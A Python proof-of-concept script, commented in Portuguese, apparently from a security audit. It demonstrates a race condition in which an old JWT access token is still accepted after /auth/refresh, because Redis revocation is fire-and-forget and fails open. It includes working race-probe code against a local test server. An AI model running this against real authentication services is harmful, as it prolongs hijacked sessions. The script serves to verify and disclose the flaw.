#!/usr/bin/env python3
"""
PoC — VULN-02: Race condition na revogação do JTI no Redis durante /auth/refresh.

Cenário:
  - Atacante tem o access_token A0 (jti J0) e o refresh_token R0 da vítima.
  - Alguém chama /auth/refresh com R0. O servidor:
      1. marca a sessão como revogada (atómico no DB)
      2. dispara revokeToken(J0) SEM await (fire-and-forget) e .catch(()=>undefined)
      3. devolve novos A1/R1
  - Imediatamente após a rotação, o atacante usa A0 num endpoint protegido.
    Esperado seguro: 401 (J0 revogado).
    Real (vulnerável): 204/200 — A0 continua aceite durante a janela de raça
    (ou pelos 15 min inteiros se o Redis estiver em baixo / DISABLE_REDIS=true,
     porque revokeToken rejeita, o .catch traga, e isRevoked falha OPEN).

Este script mede quantos pedidos com A0 são aceites DEPOIS da rotação.
Esperado seguro: 0.  Vulnerável: > 0.

Uso:
  BASE_URL=http://localhost:3000 \
  VICTIM_EMAIL=victim@example.com \
  VICTIM_PASSWORD='SenhaForte123!' \
  PROBE_ROUNDS=40 \
  python poc-vuln-02.py

Requisitos: pip install requests
"""

import os
import sys
import time
import threading
import requests

BASE_URL = os.getenv("BASE_URL", "http://localhost:3000").rstrip("/")
EMAIL = os.getenv("VICTIM_EMAIL", "victim@example.com")
PASSWORD = os.getenv("VICTIM_PASSWORD", "SenhaForte123!")
PROBE_ROUNDS = int(os.getenv("PROBE_ROUNDS", "40"))

s = requests.Session()


def banner(t: str) -> None:
    print("\n" + "=" * 70)
    print(f"  {t}")
    print("=" * 70)


def probe_access_token(token: str) -> int:
    """Usa `token` (access) num endpoint JwtAuthGuard. Devolve o HTTP status."""
    r = s.post(
        f"{BASE_URL}/auth/logout",
        headers={"Authorization": f"Bearer {token}",
                 "Content-Type": "application/json"},
        json={"refresh_token": "invalid-not-used-here"},
        timeout=10,
    )
    return r.status_code


def main() -> int:
    banner("PASSO 1 — Login legitimo (obter A0 + R0)")
    r = s.post(f"{BASE_URL}/auth/login",
               json={"email": EMAIL, "password": PASSWORD},
               headers={"Content-Type": "application/json"}, timeout=10)
    if r.status_code != 200:
        print(f"Login falhou: HTTP {r.status_code} {r.text}")
        return 2
    j = r.json()
    A0, R0 = j["access_token"], j["refresh_token"]
    print(f"A0 access_token obtido (len={len(A0)})")
    print(f"R0 refresh_token obtido (len={len(R0)})")

    banner("PASSO 2 — Sanity: A0 funciona ANTES da rotação")
    st = probe_access_token(A0)
    print(f"A0 antes da rotação -> HTTP {st}  (esperado 204/200)")
    if st in (401, 403):
        print("[-] A0 já não funciona antes da rotação — verificar setup.")
        return 1

    banner("PASSO 3 — ROTAÇÃO (refresh) + race com A0")
    # Dispara o refresh numa thread e, em paralelo, prova A0 repetidamente.
    results: list[int] = []
    lock = threading.Lock()
    stop = threading.Event()

    def racer():
        while not stop.is_set():
            stt = probe_access_token(A0)
            with lock:
                results.append(stt)
            time.sleep(0.005)

    racer_t = threading.Thread(target=racer, daemon=True)
    racer_t.start()

    # Rotacao
    rr = s.post(f"{BASE_URL}/auth/refresh",
                json={"refresh_token": R0},
                headers={"Content-Type": "application/json"}, timeout=10)
    print(f"/auth/refresh -> HTTP {rr.status_code}")
    time.sleep(0.5)  # dá tempo à janela de raça
    stop.set()
    racer_t.join(timeout=2)

    banner("PASSO 4 — Resultados")
    accepted = [c for c in results if c not in (401, 403)]
    rejected = [c for c in results if c in (401, 403)]
    print(f"Probes com A0 pos-rotacao: {len(results)}")
    print(f"  - Aceites  (!=401/403): {len(accepted)}  -> {set(accepted)}")
    print(f"  - Rejeitados (401/403): {len(rejected)}")

    # Re-probe final: se Redis em baixo, A0 continua aceite pelos 15 min.
    time.sleep(1)
    final = probe_access_token(A0)
    print(f"\nProbe final (1s depois): A0 -> HTTP {final}")

    if accepted or final not in (401, 403):
        print("\n[+] CONFIRMADO VULN-02 (ALTA): o access token antigo (A0) foi aceite")
        print("    DEPOIS da rotação do refresh. A revogação do jti não é atómica")
        print("    (fire-and-forget + .catch(()=>undefined)) e/ou o Redis está em baixo")
        print("    (isRevoked falha OPEN). Janela de tokens duplos activa.")
        return 0
    else:
        print("\n[-] A0 foi sempre rejeitado após a rotação. A vulnerabilidade pode")
        print("    não se manifestar neste ambiente (Redis rápido e ativo).")
        print("    Tente com DISABLE_REDIS=true para evidenciar o caso fail-open.")
        return 1


if __name__ == "__main__":
    sys.exit(main())
